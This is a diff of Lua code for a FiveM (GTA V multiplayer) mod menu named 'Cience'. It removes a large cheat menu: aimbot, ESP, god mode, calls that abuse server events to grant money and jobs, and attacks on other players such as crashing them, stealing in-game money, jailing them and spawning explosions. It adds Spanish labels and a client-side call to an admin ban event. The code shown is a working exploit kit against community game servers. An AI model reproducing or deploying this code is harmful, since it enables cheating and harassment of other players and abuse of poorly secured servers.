-                    t16x,
-                    function(enabled)
-                        t2x = false
-                        t4x = false
-                        t8x = false
-                        t16x = enabled
-                    end)
-                then
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("PerformanceMenu") then
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("VehSpawnOpt") then
-                if Cience.CheckBox(
-                    "Delete Current Vehicle", 
-                    DelCurVeh, 
-                    function(enabled) 
-                        DelCurVeh = enabled 
-                    end)
-                then 
-                elseif Cience.CheckBox(
-                    "Spawn In Vehicle",
-                    SpawnInVeh,
-                    function(enabled)
-                        SpawnInVeh = enabled
-                    end)
-                then
-                end
-            
-                Cience.Display()
-            elseif Cience.IsMenuOpened("MaliciousMenu") then
-                if Cience.CheckBox(
-                    "Crosshair",
-                    crosshair,
-                    function(enabled)
-                        crosshair = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Crosshair 2",
-                    crosshair2,
-                    function(enabled)
-                         crosshair2 = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Crosshair 3",
-                    crosshair3,
-                    function(enabled)
-                        crosshair3 = enabled
-                    end)
-                then    
-                elseif Cience.CheckBox(
-                '~o~Thermal Vision',
-                thermalVision,
-                function(enabled)
-                    thermalVision = enabled
-                    SetSeethrough(thermalVision)
-                end) 
-                then 
-                elseif Cience.CheckBox(
-                    "AimBot",
-                    aimbot,
-                    function(enabled)
-                        aimbot = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "ESP",
-                    esp,
-                    function(enabled)
-                        esp = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Trigger Bot",
-                    TriggerBot,
-                    function(enabled)
-                        TriggerBot = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Player Blips",
-                    playerBlips,
-                    function(enabled)
-                        playerBlips = enabled
-                    end)
-                then
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("ESXMenu") then
-                if Cience.MenuButton("∑ESX Money Options", "ESXMoneyMenu") then
-                elseif Cience.MenuButton("∑ESX Job Menu", "ESXJobMenu") then
-                elseif Cience.MenuButton("∑ESX Boss", "ESXBossMenu") then
-                elseif Cience.MenuButton("∑ESX Drugs", "ESXDrugMenu") then
-                elseif Cience.MenuButton("∑ESX Misc", "ESXMiscMenu") then
-                end
-                
-                Cience.Display()
-            elseif Cience.IsMenuOpened("ESXMiscMenu") then
-                if Cience.Button("ESX Harvest FixKit") then
-                    TriggerServerEvent('esx_mechanicjob:startHarvest')
-                elseif Cience.Button("ESX Craft FixKit") then
-                    TriggerServerEvent('esx_mechanicjob:startCraft')
-                end
-                
-                Cience.Display()
-            elseif Cience.IsMenuOpened("ESXDrugMenu") then
-                if Cience.Button('Harvest Weed (x5)') then 
-                    TriggerServerEvent('esx_drugs:startHarvestWeed')
-                    TriggerServerEvent('esx_drugs:startHarvestWeed')
-                    TriggerServerEvent('esx_drugs:startHarvestWeed')
-                    TriggerServerEvent('esx_drugs:startHarvestWeed')
-                    TriggerServerEvent('esx_drugs:startHarvestWeed')
-                elseif Cience.Button('Transform Weed (x5)') then
-                    TriggerServerEvent('esx_drugs:startTransformWeed')
-                    TriggerServerEvent('esx_drugs:startTransformWeed')
-                    TriggerServerEvent('esx_drugs:startTransformWeed')
-                    TriggerServerEvent('esx_drugs:startTransformWeed')
-                    TriggerServerEvent('esx_drugs:startTransformWeed')
-                elseif Cience.Button('Sell Weed (x5)') then
-                    TriggerServerEvent('esx_drugs:startSellWeed')
-                    TriggerServerEvent('esx_drugs:startSellWeed')
-                    TriggerServerEvent('esx_drugs:startSellWeed')
-                    TriggerServerEvent('esx_drugs:startSellWeed')
-                    TriggerServerEvent('esx_drugs:startSellWeed')
-                elseif Cience.Button('Harvest Coke (x5)') then 
-                    TriggerServerEvent('esx_drugs:startHarvestCoke')
-                    TriggerServerEvent('esx_drugs:startHarvestCoke')
-                    TriggerServerEvent('esx_drugs:startHarvestCoke')
-                    TriggerServerEvent('esx_drugs:startHarvestCoke')
-                    TriggerServerEvent('esx_drugs:startHarvestCoke')
-                elseif Cience.Button('Transform Coke (x5)') then
-                    TriggerServerEvent('esx_drugs:startTransformCoke')
-                    TriggerServerEvent('esx_drugs:startTransformCoke')
-                    TriggerServerEvent('esx_drugs:startTransformCoke')
-                    TriggerServerEvent('esx_drugs:startTransformCoke')
-                    TriggerServerEvent('esx_drugs:startTransformCoke')
-                elseif Cience.Button('Sell Coke (x5)') then
-                    TriggerServerEvent('esx_drugs:startSellCoke')
-                    TriggerServerEvent('esx_drugs:startSellCoke')
-                    TriggerServerEvent('esx_drugs:startSellCoke')
-                    TriggerServerEvent('esx_drugs:startSellCoke')
-                    TriggerServerEvent('esx_drugs:startSellCoke')
-                elseif Cience.Button('Harvest Meth (x5)') then 
-                    TriggerServerEvent('esx_drugs:startHarvestMeth')
-                    TriggerServerEvent('esx_drugs:startHarvestMeth')
-                    TriggerServerEvent('esx_drugs:startHarvestMeth')
-                    TriggerServerEvent('esx_drugs:startHarvestMeth')
-                    TriggerServerEvent('esx_drugs:startHarvestMeth')
-                elseif Cience.Button('Transform Meth (x5)') then
-                    TriggerServerEvent('esx_drugs:startTransformMeth')
-                    TriggerServerEvent('esx_drugs:startTransformMeth')
-                    TriggerServerEvent('esx_drugs:startTransformMeth')
-                    TriggerServerEvent('esx_drugs:startTransformMeth')
-                    TriggerServerEvent('esx_drugs:startTransformMeth')
-                elseif Cience.Button('Sell Meth (x5)') then
-                    TriggerServerEvent('esx_drugs:startSellMeth')
-                    TriggerServerEvent('esx_drugs:startSellMeth')
-                    TriggerServerEvent('esx_drugs:startSellMeth')
-                    TriggerServerEvent('esx_drugs:startSellMeth')
-                    TriggerServerEvent('esx_drugs:startSellMeth')
-                elseif Cience.Button('Harvest Opium (x5)') then
-                    TriggerServerEvent('esx_drugs:startHarvestOpium')
-                    TriggerServerEvent('esx_drugs:startHarvestOpium')
-                    TriggerServerEvent('esx_drugs:startHarvestOpium')
-                    TriggerServerEvent('esx_drugs:startHarvestOpium')
-                    TriggerServerEvent('esx_drugs:startHarvestOpium')
-                elseif Cience.Button('Transform Opium (x5)') then
-                    TriggerServerEvent('esx_drugs:startTransformOpium')
-                    TriggerServerEvent('esx_drugs:startTransformOpium')
-                    TriggerServerEvent('esx_drugs:startTransformOpium')
-                    TriggerServerEvent('esx_drugs:startTransformOpium')
-                    TriggerServerEvent('esx_drugs:startTransformOpium')
-                elseif Cience.Button('Sell Opium (x5)') then
-                    TriggerServerEvent('esx_drugs:startSellOpium')
-                    TriggerServerEvent('esx_drugs:startSellOpium')
-                    TriggerServerEvent('esx_drugs:startSellOpium')
-                    TriggerServerEvent ('esx_drugs:startSellOpium')
-                    TriggerServerEvent('esx_drugs:startSellOpium')
-                elseif Cience.Button('Money Wash (x10)') then
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
-                elseif Cience.Button('Stop all (Drugs)') then
-                    TriggerServerEvent('esx_drugs:stopHarvestCoke')
-                    TriggerServerEvent('esx_drugs:stopTransformCoke')
-                    TriggerServerEvent('esx_drugs:stopSellCoke')
-                    TriggerServerEvent('esx_drugs:stopHarvestMeth')
-                    TriggerServerEvent('esx_drugs:stopTransformMeth')
-                    TriggerServerEvent('esx_drugs:stopSellMeth')
-                    TriggerServerEvent('esx_drugs:stopHarvestWeed')
-                    TriggerServerEvent('esx_drugs:stopTransformWeed')
-                    TriggerServerEvent('esx_drugs:stopSellWeed')
-                    TriggerServerEvent('esx_drugs:stopHarvestOpium')
-                    TriggerServerEvent('esx_drugs:stopTransformOpium')
-                    TriggerServerEvent('esx_drugs:stopSellOpium')
-                end
-
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("ESXBossMenu") then
-                if Cience.Button("ESX Mechanic Boss Menu") then
-                    TriggerEvent("esx_society:openBossMenu",'mecano',function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","mecano",function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'mecano',function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","mecano",function(dW,dX)
-                        Cience.close()end)
-                    TriggerEvent("esx_society:openBossMenu",'mecano',function(dY,dZ)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","mecano",function(dY,dZ)
-                        Cience.close()
-                    end)
-                    Cience.CloseMenu()
-                elseif Cience.Button("ESX Police Boss Menu") then
-                    TriggerEvent("esx_society:openBossMenu",'police',function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","police",function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'police',function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","police",function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'police',function(dY,dZ)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","police",function(dY,dZ)
-                        Cience.close()
-                    end)
-                    Cience.CloseMenu()
-                elseif Cience.Button("ESX Ambulance Boss Menu") then
-                    TriggerEvent("esx_society:openBossMenu",'ambulance',function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","ambulance",function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'ambulance',function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","ambulance",function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'ambulance',function(dY,dZ)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","ambulance",function(dY,dZ)
-                        Cience.close()
-                    end)
-                        Cience.CloseMenu()
-                elseif Cience.Button("ESX Taxi Boss Menu") then
-                    TriggerEvent("esx_society:openBossMenu",'taxi',function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","taxi",function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'taxi',function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","taxi",function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'taxi',function(dY,dZ)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","taxi",function(dY,dZ)
-                        Cience.close()
-                    end)
-                        Cience.CloseMenu()
-                elseif Cience.Button("ESX Real Estate Boss Menu") then
-                    TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","realestateagent",function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","realestateagent",function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dY,dZ)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","realestateagent",function(dY,dZ)
-                        Cience.close()
-                    end)
-                        Cience.CloseMenu()
-                elseif Cience.Button("ESX Car Dealer Boss Menu") then
-                    TriggerEvent("esx_society:openBossMenu",'cardealer',function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","cardealer",function(dU,dV)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'cardealer',function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","cardealer",function(dW,dX)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu",'cardealer',function(dY,dZ)
-                        Cience.close()
-                    end)
-                    TriggerEvent("esx_society:openBossMenu","cardealer",function(dY,dZ)
-                        Cience.close()
-                    end)
-                        Cience.CloseMenu()
-                elseif Cience.Button("ESX Custom Boss Menu") then
-                    local e=KeyboardInput("Enter custom boss menu job name","",100)
-                    if e~=""then 
-                        TriggerEvent("esx_society:openBossMenu",e,function(dU,dV)
-                            Cience.close()
-                        end)
-                        TriggerEvent("esx_society:openBossMenu",e,function(dW,dX)
-                            Cience.close()
-                        end)
-                        TriggerEvent("esx_society:openBossMenu",e,function(dY,dZ)
-                            Cience.close()
-                        end)
-                        Cience.CloseMenu()
-                    end 
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("ESXJobMenu") then
-                if Cience.Button("Unemployed") then
-                    TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(-1))
-                elseif Cience.Button("Police") then
-                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"police",3)
-                elseif Cience.Button("Mechanic") then
-                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"mecano",3)
-                elseif Cience.Button("Taxi") then
-                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"taxi",3)
-                elseif Cience.Button("Ambulance") then
-                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"ambulance",3)
-                elseif Cience.Button("Real Estate Agent") then
-                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"realestateagent",3)
-                elseif Cience.Button("Car Dealer") then
-                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"cardealer",3)
-                end
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("ESXMoneyMenu") then
-                if Cience.Button("ESX TruckerJob") then
-                    local result = KeyboardInput("Enter amount of money", "", 100000000)
-                    if result then
-                        TriggerServerEvent('esx_truckerjob:pay', result)
-                    end
-                elseif Cience.Button("ESX Caution Give Back") then
-                    local result = KeyboardInput("Enter amount of money", "", 100000000)
-                    if result then
-                        TriggerServerEvent('esx_jobs:caution', 'give_back', result)
-                    end
-                elseif Cience.Button("ESX GoPostalJob") then
-                    local result = KeyboardInput("Enter amount of money", "", 100000000)
-                    if result then
-                        TriggerServerEvent("esx_gopostaljob:pay", result)
-                    end
-                elseif Cience.Button("ESX BankerJob") then
-                    local result = KeyboardInput("Enter amount of money", "", 100000000)
-                    if result then
-                        TriggerServerEvent("esx_banksecurity:pay", result)
-                    end
-                end
-            
-                Cience.Display()
-            elseif Cience.IsMenuOpened("SelfMenu") then
-                if Cience.Button("Heal") then
-                    SetEntityHealth(PlayerPedId(), 200)
-                elseif Cience.Button("Give Armor") then
-                    SetPedArmour(PlayerPedId(), 200)
-                elseif Cience.Button("ESX Set Hunger/Thirst To 100%") then
-                    TriggerEvent('esx_status:set', 'hunger', 1000000)
-                    TriggerEvent('esx_status:set', 'thirst', 1000000)
-                elseif Cience.Button("ESX Revive") then
-                    TriggerEvent("esx_ambulancejob:revive")
-                elseif Cience.Button("ESX Get Out Of Jail") then
-                    local ped = PlayerPedId(-1)
-                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
-                    TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
-                    TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
-                    TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
-                elseif Cience.Button("Suicide") then
-                    SetEntityHealth(PlayerPedId(), 0)
-                elseif  Cience.CheckBox(
-                    "God Mode",
-                    GodMode,
-                    function(enabled)
-                    GodMode = enabled
-                    end) 
-                then
-                elseif Cience.CheckBox(
-                    "Infinite Stamina",
-                    infStamina,
-                    function(enabled)
-                    infStamina = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Fast Run",
-                    fastrun,
-                    function(enabled)
-                        fastrun = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Super Jump",
-                    SuperJump,
-                    function(enabled)
-                        SuperJump = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Noclip",
-                    Noclip,
-                    function(enabled)
-                        Noclip = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "invisible",
-                    invisible,
-                    function(enabled)
-                        invisible = enabled
-                    end)
-                then
-                end
-            
                 Cience.Display()
             elseif Cience.IsMenuOpened("OnlinePlayersMenu") then
                     for i = 0, 128 do
-                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Cience.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
+                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Cience.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~MUERTO" or "~g~VIVO"), "PlayerOptionsMenu") then
                             SelectedPlayer = i
                         end
                     end
@@ -2717,471 +2106,15 @@ Citizen.CreateThread(
                     Cience.Display()
                 elseif Cience.IsMenuOpened("PlayerOptionsMenu") then
                     Cience.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
-                    if Cience.Button('Spectate', (Spectating and "~g~[SPECTATING]")) then
-                        SpectatePlayer(SelectedPlayer)
-                    elseif Cience.Button('Teleport To') then
-                        local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
-                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
-                    elseif Cience.Button("Crash Player") then
-                        CrashPlayer(GetPlayerPed(SelectedPlayer))
-                    elseif Cience.MenuButton("∑Troll Options", "PlayerTrollMenu") then
-                    elseif Cience.MenuButton("∑ESX Options", "PlayerESXMenu") then
-                    elseif Cience.MenuButton("∑Give Single Weapon", "SingleWepPlayer") then
-                    elseif Cience.Button("Give Ammo") then
-                        for i = 1, #allWeapons do
-                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
-                        end
-                    elseif Cience.Button("Give All Weapons") then
-                        for i = 1, #allWeapons do
-                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
-                        end	
-                    elseif Cience.Button("Remove All Weapons") then
-                        for i = 1, #allWeapons do
-                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
-                        end
-                    elseif Cience.Button("Give Vehicle") then
-                        local ped = GetPlayerPed(SelectedPlayer)
-                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
-    
-                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
-                            RequestModel(ModelName)
-                            while not HasModelLoaded(ModelName) do
-                                Citizen.Wait(0)
-                            end
-    
-                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
-                            drawNotification("~g~Vehicle Given To Player!")
-                        else
-                            drawNotification("~r~Model is not valid!")
-                        end
-                    elseif Cience.Button("Kick From Vehicle") then
-                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-                        drawNotification("~g~Kicked Player From Vehicle!")
-                    elseif Cience.Button("Delete Vehicle") then
-                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
-                    elseif Cience.Button("Spawn Flare On Player") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
-                    elseif Cience.Button("Spawn Smoke On Player") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)	
-                    end
-
-                    Cience.Display()
-                elseif Cience.IsMenuOpened("PlayerESXMenu") then
-                    if Cience.MenuButton("∑ESX Triggers", "PlayerESXTriggerMenu") then
-                    elseif Cience.MenuButton("∑ESX Jobs", "PlayerESXJobMenu") then
-                    end
-
-                    Cience.Display()
-                elseif Cience.IsMenuOpened("PlayerESXTriggerMenu") then
-                    if Cience.Button("ESX Revive") then
-                        TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer))
-                    elseif Cience.Button("ESX Give Money To Player From Your Wallet") then
-                        local d = KeyboardInput("Enter amount of money to give","",100)
-                        if d ~= "" then
-                            TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(selectedPlayer),"item_money","money",d)
-                        end 
-                    elseif Cience.Button("ESX Steal Money From Player") then
-                        local d=KeyboardInput("Enter amount of money to steal","",100)
-                        if d ~= "" then 
-                            TriggerServerEvent('esx:removeInventoryItem',GetPlayerServerId(selectedPlayer),"item_money","money",d)
-                        end 
-                    elseif Cience.Button("ESX Handcuff Player") then
-                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
-                    elseif Cience.Button("ESX Send To Jail") then
-                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
-                           TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
-                           TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
-                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
-                    elseif Cience.Button("ESX Get Out Of Jail") then
-                        local ped = selectedPlayer
-                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
-                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
-                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
-                        TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
-                    end
-
-                    Cience.Display()
-                elseif Cience.IsMenuOpened("PlayerESXJobMenu") then
-                    if Cience.Button("Unemployed") then
-                        TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(selectedPlayer))
-                    elseif Cience.Button("Police") then
-                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"police",3)
-                    elseif Cience.Button("Mechanic") then
-                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"mecano",3)
-                    elseif Cience.Button("Taxi") then
-                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"taxi",3)
-                    elseif Cience.Button("Ambulance") then
-                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"ambulance",3)
-                    elseif Cience.Button("Real Estate Agent") then
-                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"realestateagent",3)
-                    elseif Cience.Button("Car Dealer") then
-                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"cardealer",3)
-                    end
-                    
-                    
-                    Cience.Display()
-                elseif Cience.IsMenuOpened("PlayerTrollMenu") then
-                    if Cience.Button ("Fake Chat Message") then 
-                        local cX=KeyboardInput("Enter message to send","",100)
-                        local cY=GetPlayerName(selectedPlayer)
-                        if cX then 
-                            TriggerServerEvent('_chat:messageEntered',cY,{0,0x99,255},cX)
-                        end 
-
-                    elseif Cience.Button("Cage Player") then
-                        freezePlayer = true
-                        Citizen.Wait(10)
-                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
-                        freezePlayer = false
-                    elseif Cience.MenuButton("∑Ram Vehicles Into Player", "VehicleRamMenu") then
-                    elseif Cience.MenuButton("∑Spawn Props On Player", "SpawnPropsMenu") then
-                    elseif Cience.CheckBox(
-                        "Freeze Player",
-                        freezePlayer,
-                        function(enabled)
-                            freezePlayer = enabled
-                        end)
-                    then
-                    elseif Cience.Button("Small invisible Explosion") then
-                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
-                    elseif Cience.Button("~b~Isis Explosion") then
-                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
+                    if Cience.Button('Banear Jugador') then
+                        TriggerServerEvent("EasyAdmin:banPlayer", SelectedPlayer, reason, true)
                     end
                                     
+                    
                     Cience.Display()
-                elseif Cience.IsMenuOpened("SpawnPropsMenu") then
-                    if Cience.CheckBox(
-                        "Attach Prop To Player",
-                        attachProp,
-                        function(enabled)
-                            attachProp = enabled
-                        end)
-                    then
-                    elseif Cience.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
-                        currentBone = currentIndex
-                        selectedBone = selectedIndex
-                    end)
-                    then
-                    elseif Cience.Button("Weed") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
-                        if attachProp then
-                            if selectedBone == 1 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            elseif selectedBone == 2 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            end
-                        end	
-                    elseif Cience.Button("UFO") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
-                        if attachProp then
-                            if selectedBone == 1 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            elseif selectedBone == 2 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            end
-                        end	
-                    elseif Cience.Button("Windmill") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
-                        if attachProp then
-                            if selectedBone == 1 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            elseif selectedBone == 2 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            end
-                        end	
-                    elseif Cience.Button("Custom Prop") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local input = KeyboardInput("Enter Prop Name", "", 100)
-                        if IsModelValid(input) then
-                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
-                            if attachProp then
-                                if selectedBone == 1 then
-                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                                elseif selectedBone == 2 then
-                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                                end
-                            end	
-                        else
-                            drawNotification("Invalid Model!")
-                        end
-                    end
-
-                    Cience.Display()
-            elseif Cience.IsMenuOpened("VehicleRamMenu") then
-                if Cience.Button("Futo") then
-                    local model = GetHashKey("futo")
-                    RequestModel(model)
-                    while not HasModelLoaded(model) do
-                        Citizen.Wait(0)
-                    end
-                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
-                    if HasModelLoaded(model) then
-                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
-                        SetVehicleForwardSpeed(veh, 120.0)		
-                    end	
-                elseif Cience.Button("Bus") then
-                    local model = GetHashKey("bus")
-                    RequestModel(model)
-                    while not HasModelLoaded(model) do
-                        Citizen.Wait(0)
-                    end
-                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
-                    if HasModelLoaded(model) then
-                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
-                        SetVehicleForwardSpeed(veh, 120.0)		
-                    end		
-                end	
-                
-
-                    Cience.Display()
-            elseif Cience.IsMenuOpened("SingleWepPlayer") then
-                for i = 1, #allWeapons do
-                    if Cience.Button(allWeapons[i]) then
